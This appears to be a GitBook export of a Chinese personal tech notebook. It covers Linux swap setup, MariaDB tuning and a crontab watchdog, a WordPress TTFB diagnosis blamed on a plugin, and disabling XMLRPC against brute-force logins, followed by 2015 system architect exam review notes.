按照习惯，建议swap交换分区的大小为实际物理内存的2~2.5倍。在本例中的物理内存是2G，因此这里创建4G的交换分区。 此前先通过df -h命令查看硬盘是否有大于4G的可用空间（本例中可见剩余36G，足够了）： Filesystem　　Size　Used　Avail　Use%　Mounted on 　/dev/vda1　　　50G　　12G　36G　25%　　　/ 　devtmpfs　　　909M 　 0　　909M　0%　　　/dev 　tmpfs　　　　　920M　24K　920M　1%　　　/dev/shm 　tmpfs　　　　　920M　460K　919M　1%　　/run 　tmpfs　　　　　920M　　0　　920M　0%　　/sys/fs/cgroup 　tmpfs　　　　　184M　　0　　184M　0%　　/run/user/0 使用dd命令创建swap交换分区文件/home/swap，大小为4G（由于较大，可能耗时较久）： dd if=/dev/zero of=/home/swap bs=1024 count=4096000 # 命令参数解析 # if=：代表输入文件，默认从stdin中读取输入。/dev/zero 是一个字符设备，会不断返回0值字节（\\0） # of=：代表输出文件，默认以stdout作为输出 # bs=：交换分区的读写是以block（块）为单位的，每个block的大小默认为1K，即1024字节 # count=：交换分区文件的block数，count*bs就是交换分区的大小 # 若创建成功则返回： # 4096000+0 records in # 4096000+0 records out # 4194304000 bytes (4.2 GB) copied, 40.4638 s, 104 MB/s 在这个交换分区文件上创建交换分区： mkswap /home/swap # 若创建成功则返回： # Setting up swapspace version 1, size = 4095996 KiB # no label, UUID=ec9e00e2-3d82-4bc0-bc99-e2e4837dcca5 激活交换分区： swapon /home/swap # 若激活成功则返回： # swapon: /home/swap: insecure permissions 0644, 0600 suggested. 再次通过free -mh命令查看内存和swap的分配情况： 　　　　total　　used　　　free　　shared　buff/cache　available Mem: 　　　1.8G　　662M　　210M　　560K　　　965M　　　1.0G Swap:　　　3.9G　　　　0B　　　3.9G 或通过swapon -s命令查看本机已配置的swap空间： Filename　　　Type　　　　Size　Used　Priority /home/swap　　　　file　　4095996　　0　　　-1 为了避免系统重启后交换分区失效，需要设置交换分区在开机后自动挂载。 由于系统开机时会主动读取/etc/fstab文件里的配置进行磁盘挂载，这样只需要将交换分区的挂载信息写入这个文件中就可以了。 通过命令vi /etc/fstab编辑文件，在末尾增加下面一行并保存即可： /home/swap swap swap defaults 0 0 至此交换分区创建完成。 附1：减少InnoDB的需求缓存 一般来说，设置了交换分区就已经解决了这个问题了。但这里还是附上裁减InnoDB缓存的设置方法，针对一些内存极少的机器还是需要的。 首先登陆到Mariadb数据库mysql -u root -p，通过SQL查看当前InnoDB缓存是多大（若未修改过任何配置，默认情况下应该是128M）： SELECT @@innodb_buffer_pool_size/1024/1024; +-+ | @@innodb_buffer_pool_size/1024/1024 | +-+ | 128.00000000 | +-+ 若要变更，只需在Mariadb配置文件修改·innodb_buffer_pool_size·参数大小即可。 默认情况下，Centos的Mariadb配置文件位置为： /etc/my.cnf 但是官方并不推荐修改这个配置文件，因为当Mariadb升级时很可能会将其覆盖掉。不过这个配置文件会包含了一个配置目录/etc/my.cnf.d，其下的全部配置文件都会被包含进来。默认情况下，目录/etc/my.cnf.d内有三个配置文件： /etc/my.cnf.d/client.cnf /etc/my.cnf.d/mysql-clients.cnf /etc/my.cnf.d/server.cnf 一般情况下，我们只需修改/etc/my.cnf.d/server.cnf配置文件即可。但是也可以在/etc/my.cnf.d目录下创建新的配置文件（它将被/etc/my.cnf自动包含）。 在本例中我们选择后者，即在/etc/my.cnf.d目录下创建新的配置文件。 打开/usr/share/mysql目录，可以发现这里有一些现成的mysql数据库样例配置文件，对应不同的使用场景： my-huge.cnf my-innodb-heavy-4G.cnf my-large.cnf my-medium.cnf my-small.cnf 这里把my-medium.cnf拷贝过来： cp /usr/share/mysql/my-medium.cnf /etc/my.cnf.d/ 通过命令vi /etc/my.cnf.d/my-medium.cnf编辑配置文件，找到innodb_buffer_pool_size参数，去掉前面的#注释并修改成期望的大小即可（本文改成了32M）。 修改完成后，需重启Mariadb服务使其生效： systemctl restart mariadb 附2：利用crontab守护Mariadb 作为备用方案，可利用crontab实时监控Mariadb的进程状态，万一崩溃则自动重启Mariadb进程，这样在最坏的情况下也能保证站点的正常使用了。 crontab是Centos内置的定时计划服务，可以用以下命令启动和停止服务： systemctl start crond.service # 启动crontab服务 systemctl stop crond.service # 停止crontab服务 使用crontab -e命令在crontab添加一行计划任务（拷贝下面的命令到末尾保存即可）：每分钟对Mariadb进程进行检查，若进程不存在则重新启动数据库服务： */1 * * * * if [ -z `ps -ef|grep mariadb|grep -v grep|awk '{print $2}'` ];then systemctl start mariadb;fi # 此计划任务解释： # */1 * * * *： 是cron表达式，这里表示每分钟执行一次。cron的语法可自行谷歌或百度 # ps -ef：表示查看当前运行中的进程列表 # grep mariadb：表示仅保留包含mariadb关键字的进程 # grep -v grep：表示排除包含grep关键字的进程 # awk '{print $2}'：表示提取进程号 # -z：表示判断进程号是否为空 重载或重启crontab使配置生效： systemctl reload crond.service # 重载crontab配置 systemctl restart crond.service # 重启crontab服务 通过crontab -l命令可确认当前用户的计划任务列表。 需注意crontab默认不会开机自启，可编辑vi /etc/rc.d/rc.local文件，在末尾添加以下内容并保存即可： systemctl start crond.service 资源下载 本文全文下载 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/website/记一次TTFB的优化过程.html":{"url":"markdown/notes/website/记一次TTFB的优化过程.html","title":"记一次 TTFB 的优化过程","keywords":"","body":"WP站点的TTFB过长？记一次TTFB的优化过程问题科普推测分析总结WP站点的TTFB过长？记一次TTFB的优化过程 问题 最近发现打开网站的响应时间变得很长，在浏览器通过F12打开控制台发现TTFB高达6秒。 而且经测试发现，不仅站点所有页面打开时的TTFB都需要6秒，连打开站点后台的TTFB也是固定6秒。 科普 首先简单解析下，什么是TTFB？ TTFB (Time To First Byte)，是最初的网络请求被发起到从服务器接收到第一个字节这段时间，它包含了TCP连接时间，发送HTTP请求时间和获得响应消息第一个字节的时间。 推测 查询很多处理TTFB过慢文章，很多都是说减少DNS、使用CDN、提高服务器性能、甚至还与各个地区访问服务器的延迟状态等等方法。 但是经过初步测试，我判断并不是上面的原因引起的，这是因为： 直接通过IP访问站点（即跳过DNS解析），TTFB依旧是6秒 把站点展示的内容（图文数据）完全克隆到另一台测试服务器（性能比正式服务器低），TTFB只有不到1秒 我的测试服务器和正式服务器是同一地区的，而测试服能达到秒级响应，说明不是地域问题 但有个地方引起我的关注： 正式服务器前后台的TTFB均是6秒，克隆内容后的测试服务器TTFB不到1秒 因此我初步分析，很有可能在我打开站点的时候，站点做了某个行为，这个行为不论在我打开站点前台还是后台都会触发的，而这个行为跟我站点的展示内容无关。 分析 那么如何定位到这个行为是什么就是关键了。 考虑到TTFB的特点，这个行为要么发生在“TCP连接时间”，要么发生在“发送HTTP请求时间和获得响应消息第一个字节的时间”。但是发现站点的ping延迟并不高，因此嫌疑最重的就是后者。 但是就一般而言，站点收到HTTP请求并不会执行什么特殊操作，但是为了展示界面，一定会做的就是数据库访问，因此为了进一步定位是否为数据库导致的，我需要知道在访问网站的同时，站点执行了哪些SQL，每条SQL耗时多长。 为此，查看数据库日志是最直接的。 一般情况下，WP使用的是 mysql/mariadb ，数据库日志默认是关闭的，因此需要先激活日志功能： 使用root用户登陆到数据库后，检查“数据库日志”是否开启： SHOW VARIABLES LIKE 'general%'; # 这份日志会保存到数据库的安装目录， Centos7默认的目录是 /var/lib/mysql/ +------+-----------+ | Variable_name | Value | +------+-----------+ | general_log | OFF | | general_log_file | VM_211_224_centos.log | +------+-----------+ 若为OFF，则开启之（这个选项的作用是把所有SQL操作打印到日志）： SET GLOBAL general_log='ON'; # 当调试完毕后记得关闭之，否则太耗服务器资源了 另外，还有一个相关的“慢查询日志”，检查是否开启： SHOW VARIABLES LIKE '%slow_query_log%'; # 这份日志会保存到数据库的安装目录， Centos7默认的目录是 /var/lib/mysql/ +---------+----+ | Variable_name | Value | +---------+----+ | slow_query_log | OFF | | slow_query_log_file | VM_211_224_centos-slow.log | +---------+----+ 若为OFF，则开启之（这个选项的作用是把执行时间超过一定数值的SQL打印到日志）： SET GLOBAL slow_query_log='ON'; # 当调试完毕后记得关闭之，否则太耗服务器资源了 无需重启数据库，直接刷新站点，发现 VM_211_224_centos.log 日志有内容，VM_211_224_centos-slow.log日志无内容（当然这是针对我的情况而言，mysql/mariadb默认超过10秒的SQL才是慢查询，后者没日志很可能就是因为并不存在这类SQL）。 虽然 VM_211_224_centos.log 日志有内容，但也仅仅是一股脑把所有SQL列印出来而已，并不能反映每条SQL的执行时长。 但是这里可以通过tail -f实时直播日志的打印，以判断执行哪些SQL时会有停顿： tail -10f /var/lib/mysql/VM_211_224_centos.log 刷新网站后，发现日志只在这个SQL执行的时候出现卡顿： SELECT meta_value FROM wp_clean_up_optimizer_meta WHERE meta_key='other_settings' 我马上就发现，wp_clean_up_optimizer_meta这张表是属于之前安装的数据库优化插件【Clean Up Optimizer】的。检查这张表的数据，存储了约4000条recent_login_data，而这些数据记录的是近期发生过的登陆行为，且含有不少长文本： select * from wp_clean_up_optimizer_meta where meta_key = 'recent_login_data'; 检查插件【Clean Up Optimizer】，确实有记录近期尝试登陆的用户信息的功能，且这个功能无法关闭。 而我相信任何一个作为WP的站长，都很清楚每天被大量机器人尝试登陆自己的站点已经不是什么鲜为人知的秘密。 为此带来的问题就是wp_clean_up_optimizer_meta表会因为这些无效登陆而日益膨胀。 虽然我不清楚这个插件有什么理由需要在每次打开站点页面时都去查询这张表，但是任由这张表去膨胀而不加约束、甚至不提供功能开关、还不加索引查询，都是很蠢的行为，而这正是导致这一系列问题的元凶。 于是，我停用了这个插件，现在打开任意页面，TTFB都降低到秒级了。 总结 需知道，每个站点TTFB变慢都可能有其特殊原因，并不能一概而论地去烦恼DNS、CDN等问题。 文本只是根据我的经验，提供一个排查思路，仅供参考。 最后，我给这个插件的作者发了一封邮件，这个事情就这么解决了。 但是讽刺的是，作为一个数据库优化的插件，却因为数据库的问题成为了网站访问延迟的元凶，看来我们也不能太过依赖一些便利的工具了。但我又转念一想，杀软和病毒，也不恰恰正是因为这种相互依赖关系才得以共存么？呵。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/website/禁用XMLRPC避免DDOS.html":{"url":"markdown/notes/website/禁用XMLRPC避免DDOS.html","title":"禁用 XMLRPC 避免 DDOS","keywords":"","body":"禁用 XMLRPC 避免 WP 站点被 DDOS 或暴力登录诱因分析处理禁用 XMLRPC 避免 WP 站点被 DDOS 或暴力登录 诱因 自从使用 Wordpress 建站以来，就一直被机器人暴力爆破登录密码，其规模已经足以引起DDos攻击，导致服务器启动没多久，资源就被耗尽，打开极其缓慢。 即使安装 Limit Login Attempts 插件进行登录限制，依然会被机器人用 IP 池持续攻击，成效甚微： 分析 从 Limit Login Attempts 插件的限制日志可以发现， 通过 XMLRPC 登录的次数远远大于通过 WP Login 登录的次数。 WP Login 就是通过 http://${site-url}/wp-login.php 直接登录， Limit Login Attempts 插件会加上校验码，使其不容易被爆破。 而 XMLRPC 的全称是 XML Remote Procedure Call，即 XML远程方法调用。它是 XHR （即 XMLHttpRequest）的一种实现，其交互消息都是基于 HTTP-POST 请求，请求的内容是 XML，服务端的返回结果同样也是 XML。 对于爬虫机器人而言，相对于 WP Login 方式，使用 XMLRPC 会更方便。因为前者更接近仿真方式登录，而后者则是纯脚本交互，而且可以绕过 Limit Login Attempts 等插件对登录页面的保护。 处理 知道根源，处理就很简单了。因为作为站长，一般是用不到 XMLRPC 去管理自己站点的，所以禁用它即可。 而禁用的方法有很多，最简单直接的方法，就是修改网站后台根目录的 .htaccess 文件，在末尾加上这段内容即可： # forbit xmlrpc.php request (crawler, ddos, ...) order deny,allow deny from all Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/resource/":{"url":"markdown/resource/","title":"资源分享","keywords":"","body":"资源分享资源分享 2015 系统架构师复习资料 WP插件：Auto Add Copyright 自动追加版权 WP插件：Baidu Links Submit 百度自动推送 WP侧栏小挂件：WP Statistics 改版 “文章/访问统计” WP侧栏小挂件：高仿CSDN的 \"关于我\" Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/resource/2015系统架构师复习资料.html":{"url":"markdown/resource/2015系统架构师复习资料.html","title":"2015 系统架构师复习资料","keywords":"","body":"2015系统架构师复习资料前言上午题版本号规范CISC（复杂 指令集计算机）和RISC（精简指令集计算机）并发任务的同步互斥PV原语看门狗（Watch Dog）高速缓存存储管理方案数据库范式（P25）数据库设计步骤（P27）* 关系模式分解实体关系向关系模型的转换规则数据库的数据集成商业智能的主要技术（P30）数据挖掘（P32）多媒体技术标准（P42）视频压缩技术结构化布线系统性能评估指标（P47）系统测试冒烟测试集成测试软件测试与软件调试区别单元测试-桩模块测试分类基准测试程序（P49）四种评价程序的准确度（P49）软件设计和软件测试与电子政务相关的行为主体（P59）企业信息化目的（P62）ERP（企业资源计划）结构（P66）CRM（客户关系管理系统）的定位（P68）企业门户分类（P74）知识产权的相关法律法规（P88）敏捷开发的核心思想 / 特点 （P98）敏捷开发核心价值观（P99）敏捷开发实践规则（P99）极限编程（XP）的13个核心实践（P99）RUP（统一软件开发过程）阶段任务（P101）项目管理工具（P108）需求管理（P109）需求变更策略（P112）项目范围定义（P116）项目时间管理（P116）产品配置的配置项（P117）程序静态分析静态分析技术遗留系统的演化策略逆向工程导出信息级别（P123）软件架构设计的生命周期（P125）架构模式、设计模式、惯用法的区别软件架构的主要作用（P127）软件架构策略体系结构失配（P128）软件架构的重要性（P130）DSSA特定领域架构的角色与任务（P145）ATAM体系架构权衡分析方法（P152）软件设计阶段的度量耦合程度文档评审形式化方法用例图-用例间关系（P159）UML面向对象设计（P176）软件构件概念（P247）构件设计原则构件依赖关系基于构件开发模型的顺序执行阶段基于构件的软件工程的复用性计划加密解密技术（P307）网络七层协议（P317）Internet三种服务质量类型网络分层设计模型（三层模型）网络开发过程网络存储方式SNMP.v3（简单网络管理协议）网络架构数据流图的内容HTTP超文本传输协议RIP路由协议系统可维护性评价指标（P397）系统维护工作类型（P397）计算机质量保证计划规范内容集成平台的基本功能（P449）企业集成模式（P451）企业应用集成EDI电子数据交换（P462）嵌入式系统软硬件协同设计过程（P510）下午题Mysql主从复制优点Memcached缓存与数据库缓存差异数据库系统提供的基本加解密方式反规范化技术数据库分区NoSQL的优缺点负载均衡技术（P40）ABSD（基于体系结构的软件架构设计）概念（P131）ABSD方法的三个基础（P131）ABSD的6个主要活动/子过程（P133）ABSD需求过程（P133）ABSD设计过程（P134）ABSD文档化（P135）ABSD复审（P135）ABSD实现过程（P135）ABSD演化过程（P136）系统架构风格（P137）系统质量属性（P147）系统架构评估（P149）UML的10种4类模型视图（P158）数据流图数据流图的常见错误类型数据流图、流程图的含义与区别数据流图设计原则CRUD矩阵4+1视图（P181 - 图P103）设计模式（P195）获取构件的方法（P247）开发构件的策略（P267）构件组装（P271）主流构件标准（P275）主要的身份认证技术（P315）授权侵犯抗抵赖框架基于口令的简单认证机制 与 基于公钥体系的认证机制 优缺点比较对称加密策略公钥加密策略软件可靠性的定量描述（P355）可靠性设计技术（P377）容错设计技术（P377）恢复块设计（P377）N版本程序设计（P377）冗余技术（P377）动态冗余（P378）检错技术优缺点（P378）检错设计技术要素（P378）FMEA失效模式与效应分析（P379）FMEA主要活动FMEA分类ODP分布式数据架构（P382）集中式数据架构集中式和分布式数据架构的扩展方式开放式架构的基本特点MVC架构风格（P419）MVC设计模式-示例图（P419）MVC模式的优点（P420）从设计模式角度描述用XML作为GUI描述语言的机制（P421）基于XML的界面管理技术（P422）基于XML的界面管理技术框架-示例图（P423）TLS三层栈软件总体架构特点嵌入式操作系统VxWorks与Linux的差异（P505）Linux操作系统特点嵌入式操作系统故障类型嵌入式操作系统故障滤波算法嵌入式操作系统容错算法基于VME总线机载和基于FC总线机载的嵌入式系统架构比较ESB企业服务总线（P537）ESB主要功能（P538）ESB作为集成框架的优点项目计划应包含的内容缩短项目工期的方式REST表现层状态转换技术REST设计原则XACML（可扩展访问控制标记语言）相对于MAC（强制访问控制）的优点论文题论文通用题型论文评分点论文模板示例论文历年论文题目2015系统架构师复习资料 前言 经过一年的复习，鄙人终于通过了15年的 【系统架构师】 资格考试啦 O(∩_∩)O 为了更多人都可以通过，分享一下我自己整理的复习要点~ 不过现在 架构师 的考点还不稳定，大家在复习的时候也要善于自己总结哦！ 我整理复习资料分为【上午题】【下午题】【论文】三部分， 结合了07~14年的真题，去除了重复题型整编的~ 【上午题（Go）】以理解为主，当然如果有能力背下来是最好的 【下午题（Go）】以背为主，当然最理想是都实践过这些知识点，理解了才更好背 【论文题（Go）】我只有给提纲，这个必须多练~ 除了练题型，也要练字迹、练手速 因为下午题（2.5H）完了之后，休息15min就要写论文，论文只有2H，想合格3000字是必须的~ 换言之你需要连续写字写4.5H，不想手腐就写写写写吧。。。 至少一星期一篇，，， 顺便吐槽一下15年的考试~~ 上午题偏僻~ 下午题偏易~ 论文题有架构风格肯定大众必选的45分保底题型~ 复习资料下载 官方教材《系统架构设计师教程》下载（密码：ndkiyi） [info] 本文标题后若标注了【Pxx】字样，表示在《系统架构设计师教程》的第 xx 页有相关内容 上午题 版本号规范 处于“草稿”状态的版本号都是以“0.”格式开头 处于“正式”状态的版本号格式为“X.Y”（X为主版本号，取值1~9，Y为次版本号，取值0~9） 处于“修改”状态的版本号格式为“X.YZ” CISC（复杂 指令集计算机）和RISC（精简指令集计算机） 比较内容 CISC RISC 指令系统 复杂，庞大 简单，精简 指令数目 一般 > 200 一般 指令格式 一般 > 4种 一般 寻址方式 一般 > 4种 一般 指令字长 不固定，1~15字节 等长，通常为4字节 可访存指令 不加限制 只有LOAD / STORE等指令 各种指令使用频率 相差很大 相差不大 优化编译实现 很难 较容易 程序源代码长度 较短 较长 控制器实现方式 绝大多数为微程序控制 绝大多数为硬布线控制 芯片设计复杂度 高 低 软件系统开发时间 较短 较长 操作 可以对存储器和寄存器进行算术和逻辑操作 设置大量通用寄存器，访问存储器指令简单，只能对寄存器进行算术和逻辑操作 执行时间 有些指令执行时间很长 选取使用频率较高的一些简单指令，且指令执行时间较短 并发任务的同步互斥 同步：进程间的直接制约关系，如生产者消费者问题 互斥：进程间的间接制约关系，如临界资源的PV操作 PV原语 P原语：Proberen（测试），为阻塞原语，负责把当前进程由运行态转为阻塞态，等待唤醒。 　　　　　其操作为：申请一个空闲资源（信号量-1），成功退出，失败阻塞。 V原语：Verhogen（增加），为唤醒原语，负责唤醒一个阻塞进程。　　　　　其操作为：释放一个被占用的资源（信号量+1）。 看门狗（Watch Dog） WDT（Watch Dog Timer）是一个定时电路，一般有一个输入，叫“喂狗”，一个输出到MCU（微控制单元）的RTS端（标志位，表示复位连接）。 MCU正常工作时，每隔一段时间输出一个信号到喂狗端清零，若超时不喂狗，WDT定时器超时，就会给出复位信号（复位中断）到MCU，使MCU复位，防止死机。 WDT的作用就是防止程序死循环或跑飞（系统受到干扰后偏离正常运行的路径）。 高速缓存 高速缓存介于CPU与主存（内存）之间，利用局部性原理消减CPU与主存之间的速度差以提升系统性能。其工作速度数倍于主存，全部功能由硬件实现，且对程序员透明。 存储管理方案 覆盖：编程时必须划分程序模块和确定程序模块之间的调用关系，不存在调用关系的模块可以占用相同的主存区。 固定分区：在系统进行初始化的时候就已经将主存空间划分成大小相等或不等的块，并且这些块的大小在此后是不可以改变的。系统将程序分配在连续的区域中。 请求分页：主存空间和程序按固定大小单位进行分割，程序可以分配在不连续的区域中。该方案当一个作业的程序地址空间大于主存可以使用的空间时也可以执行。 数据库范式（P25） 1NF：原子式。 2NF：所有字段都必须与主键有直接或间接相关，允许某些字段与候选码传递或非传递依赖。 3NF：所有字段都必须与主键直接相关，允许某些字段与候选码传递或非传递依赖。 BCNF：所有字段都必须与主键直接相关，不允许存在字段与候选码有传递或非传递依赖。 数据库设计步骤（P27） 需求分析：DFD 概念结构设计：E-R图 逻辑结构设计：确定数据模型（由E-R图转换）、约束 物理结构设计：利用DBMS设计数据库 应用程序设计：对DBMS的二次开发，存储用户信息，实现用户处理要求 运行维护：数据的转储和恢复、安全性和完整性控制、性能监督、数据库重组等 * 关系模式分解 无损分解算法：LOSSLESSTEST(R, F ,p) 算法。 定理： 关系模式R(U)，分解为 p={R(U1),R(U2)} p是无损连接的，当且仅当 U1∩U2 → U1-U2 或 U1∩U2 → U2-U1 分解保持依赖 - 最小依赖集： ① 将F中的所有依赖右边化为单一元素 ② 去掉F中的所有依赖左边的冗余属性 ③ 去掉F中所有冗余依赖关系 实体关系向关系模型的转换规则 多对多的联系 [必须] 转换成一个独立的关系模式 一对多的联系既可以转换成一个独立的关系模式，也可以与多端关系模式合并（此时需把一端的码合并到多端关系模式中） 数据库的数据集成 若单表即可完成整合，则可以将该表封装为记录，采用 [主动记录] 方式进行集成 若需要多表进行数据整合，则需要采用 [数据映射] 方式完成数据集成与处理 商业智能的主要技术（P30） 数据仓库、联机分析、数据挖掘 数据挖掘（P32） 目标：从数据库的大量数据中揭示出隐含的、先前未知的并有潜在价值的信息。 挖掘信息特征：先知、有效、实用。 主要功能（任务）：自动预测趋势和行为、关联分析、聚类、概念描述、偏差检测。 挖掘技术：关联分析、序列分析、分类分析、聚类分析、预测、时间序列分析。 挖掘流程：确定挖掘对象、准备数据、建立模型、数据挖掘、结果分析、知识应用。 多媒体技术标准（P42） 静态图像压缩编码标准：JPEG 运动图像压缩标准：MPEG MPEG-1：应用于VCD、CD、MP3 MPEG-2：应用于DVD、HDTV MPEG-4：面向低速、低码率的传输条件（如移动网） 另外，MPEG-7是多媒体接口标准，MPEG-21是多媒体框架标准 视频压缩技术 视频图像本身在时间和空间上都存在冗余信息。 视频图像压缩技术的基本思想和方法可归纳为： 在空间上，图像数据压缩采用JPEG压缩方法去除冗余信息，主要包括 [帧内预测] 和 [变换编码] 在时间上，图像数据采用 [帧间预测编码] 和 [运动补偿] 去除冗余信息。 视频压缩中包括 [有损压缩] 和 [无损压缩] 两种： 无损压缩： [哈夫曼编码]、 [行程编码] 有损压缩： [预测编码]、 [变换编码]、 [运动补偿] 结构化布线系统 工作区子系统（如PC到房间路由）　　由终端设备到信息插座的整个区域，用于将终端设备连接到布线系统。 水平子系统（如房间内多个PC间的拓扑支线）　　连接用户工作区与布线系统主干的子系统，起支线作用，将所有用户通过连接件连接到配线设备上。 管理子系统（如房间路由到楼层交换机）　　对布线电缆进行端接及配线管理的子系统，由各种交换设备（如集线器、交换机等）组成。 干线子系统 / 垂直子系统（如各楼层交换机之间的连接干线）　　连接各管理间、设备间的子系统。 设备间子系统（如大楼网箱）　　主要用于安放网络关键设备（如程控交换机等），地位重要，但不一定有，大型建筑一般有多个。 建筑群子系统（如大楼间的光纤电缆、无线网等）　　连接楼群间通信传输介质及各种支持设备组成的子系统，传输介质可以是有线或无线。 性能评估指标（P47） 计算机：时钟频率（主频）、运算速度、运算精度、内存容量、存取周期等等 路由器：设备吞吐量、端口吞吐量、丢包率、时延、时延抖动等等 交换机：背板吞吐量、换成区大小、最大MAC地址表大小、负载均衡等等 网络：设备级性能指标、网络级性能指标、应用级性能指标、用户级性能指标、吞吐量 操作系统：可靠性、吞吐量（率）、系统响应时间、系统资源利用率、可移植性 数据库管理系统：数据库大小、表数量、单表大小、单表允许最大行/列/索引数量等等 Web服务器：最大并发连接数、响应延迟、吞吐量 系统测试 系统测试是将已经确认的软件、计算机硬件、外设和网络等其他因素结合在一起，进行信息系统的各种集成测试和确认测试。 系统测试根据系统方案说明书来设计测试用例，常见的测试内容包括恢复测试、安全性测试、压力测试、性能测试、可靠性测试、可用性测试、可维护性测试和安装测试。 冒烟测试 将代码更改嵌入到产品的源代码之前，对这些更改进行验证的过程。 采用极限编程（XP）的“持续集成”策略有助于建立冒烟测试的环境。 集成测试 - 非增量式测试 增量式测试 错误定位 不容易定位错误 容易定位错误、排除故障 测试强度 小 大，先加入的模块经过多次测试，测试更彻底 测试工作量 小 大 测试进度 对各个模块可以并行测试，加快测试进度 测试过程长、进度慢 测试辅助程序 每个中间模块的测试都需要编写驱动模块和桩模块 自顶向下的增加需要编写桩模块自底向上的增加需要编写驱动模块 软件测试与软件调试区别 测试是为了发现软件中存在的错误。调试是为了证明软件开发的正确性。 测试以已知条件开始，使用预先定义的程序，且有预知的结果，不可预见的仅是程序是否通过测试。调试以一段不可知的内部条件开始，除统计性调试外，结果是不可预见的。 测试是有计划的、需要进行测试设计。调试是不受时间约束的。 测试经历发现错误、改正错误、重新测试的过程。调试是一个推理的过程。 测试经常是独立的测试组在不了解软件设计的条件下完成的。调试必须由了解详细设计的开发人员完成。 大多数测试的执行和设计可由工具支持。调试时，开发人员能利用的工具主要是调试器。 单元测试-桩模块 桩模块是指 模拟 [被测试模块] [所调用的模块] ，而不是软件产品的组成部分。 主模块作为驱动模块，在单元测试时，与之直接相连的模块可用 桩模块 代替。 测试分类 负载测试：运行某些诊断程序，加大负载，检查哪个设备会发生故障。 集成测试：验证程序模块之间的接口是否正常起作用 白盒测试：根据程序的内部结构和内部逻辑，测试程序是否正确 基准测试：运行一个标准程序对多种计算机系统进行检查，以比较和评价它们的性能 基准测试程序（P49） 把应用程序中用得最多、最频繁的那部分 [核心程序] 作为评价计算机性能的标准程序，称为基准测试程序，一般使用公认的第三方测试。 四种评价程序的准确度（P49） 依靠评价程序评价机器的性能，按评测准确度由高至低的4种评价程序为： 真实的程序 > 核心程序 > 小型基准程序 > 合成基准程序 软件设计和软件测试 软件设计应从“宏观”的软件架构开始，“微观”的构件模块结束。 软件测试则相反，应从“微观”开始，“宏观”结束。 与电子政务相关的行为主体（P59） 政府、企业/事业单位、公民/居民 企业信息化目的（P62） 技术创新 管理创新：按照市场发展的要求，对企业现有的管理流程重新整合，　　　　　　从作为管理核心的财务、资金管理，转向技术、物资、人力资源的管理，　　　　　　并延伸到企业技术创新、工艺设计、产品设计、生产制造过程的管理，　　　　　　进而还要扩展到客户关系管理、供应链的管理乃至发展到电子商务。 制度创新 ERP（企业资源计划）结构（P66） （1）生产预测：对市场需求进行预测，其结果用于计划。 （2）销售管理计划：对销售部门的相关业务进行管理，属于决策层（最高层）计划。 （3）经营计划（生产计划大纲）　根据经营计划的生产目标制定，是对企业经营计划的细化，用于描述企业在可用资源的条件下，在一定时期中的产量计划。 （4）主生产计划　其编制是ERP的主要工作内容，是对企业生产计划大纲的细化，说明在一定时期内生产什么、生产多少和什么时候交货。 （5）物料需求计划　是对主生产计划的各个项目所需的全部制造件和全部采购件的网络支持计划和时间进度计划，属于ERP管理层计划。 （6）能力需求计划　是对物料需求计划所需能力进行核算的一种计划管理方法，能够帮助企业今早发现生产能力的瓶颈、为实现企业的生产任务而提供能力方面的保障。 （7）车间作业计划　按照交货期的前后和生产优先级选择原则、以及车间的生产资源情况，将生产计划以订单形式下达给适当的车间，属于ERP执行层计划。 （8）采购与库存管理　采购管理：对订单产生至货物收到的全过程进行组织、实施和控制。　库存管理：对企业物料的进、出、存进行管理。 （9）质量与设备管理　质量管理：贯穿企业管理的始终。　设备管理：对设备寿命周期内的所有设备物资运动形态和价值运动形态进行综合管理。 （10）财务管理：以货币形式反映和监督企业日常经济活动，为企业管理和决策提供必要的信息支持。 （11）ERP有关扩展应用模块：如客户关系管理（CRM）、分销资源管理、供应链管理、电子商务等。 其中，（3）（4）（5）（6）（7）又称作是ERP的五层计划。 CRM（客户关系管理系统）的定位（P68） 在注重提高客户满意度的同时，一定要把帮助企业提高获取利润的能力作为重要指标。 企业门户分类（P74） 企业信息门户：强调为访问结构数据和无结构数据提供一个统一的入口 企业知识门户：强调提高企业范围内的知识共享，减少员工解决问题时间，提高工作效率 企业应用门户：提高企业集中贸易能力、协同能力和信息管理能力的平台 垂直门户：为某一特定的行业服务的，传送的信息值属于人们感兴趣的领域。 知识产权的相关法律法规（P88） 软件著作权的产生时间，是自软件开发完成之日时。 软件商标权的保护对象是软件注册商标。 为介绍、评论某一作品或者说明某一问题，在作品中适当引用他人已发表的作品，可以不经著作权人许可，不向其支付报酬。 法律法规，国家机关决议、决定、命令和其他具有立法、行政、司法性质的文件，及其官方译文均不适用或不受著作权法保护。 口述作品（如某人在公共场所的即兴演说）适用于著作权法，并受其保护。 著作权权利中，署名权、修改权、保护作品完整权的保护期不受时间限制，发表权的保护期限为作者终生及其死亡后五十年（截止于作者死亡后第五十年的12月31日）。 通过反向编译技术、净室技术、反向工程技术等获得他人软件技术构思、技术方案并直接用于其自身软件产品的行为，在我国暂无相关法律法规限制，在著作权法中不构成侵权（著作权法也不保护思想）。 商业秘密要受到法律保护，必须同时满足三个条件：不为公众所知悉、具有实用性、采取了保密措施。缺少任意一个均会丧失法律保护。 公司享有 [员工任职期间利用公司资源所开发的软件] 的著作权，不论是否和该员工签订了劳动合同。 专利法规定，申请专利的发明创造在 [申请日以前6个月内] ，有下列情形之一的不丧失新颖性：① 在中国政府主办或者承认的国际展览会上首次展出的；② 在规定的学术会议或者技术会议上首次发表的； ③ 他人未经申请人同意而泄露其内容的。 知识产权的保护以所执行国家的当地法律为准，不受被保护对象的身份国籍影响。 敏捷开发的核心思想 / 特点 （P98） 适应型而非预测型，拥抱变化 以人为本而非以过程为本，强调充分发挥人的特性 迭代增量式开发，以原型开发为核心，发行版本小型化 敏捷开发核心价值观（P99） 沟通、简单、反馈、勇气 敏捷开发实践规则（P99） 简单设计，测试驱动，代码重构，结对编程，持续集成，现场客户，发行版本小型化，系统隐喻，代码集体所有制，规划策略，规范代码，40小时工作制 极限编程（XP）的13个核心实践（P99） 团队协作、规划策略、结对编程、测试驱动开发、重构、简单设计、代码集体所有权、持续集成、客户测试、每周40小时工作制、编码规范、系统隐喻、小型发布 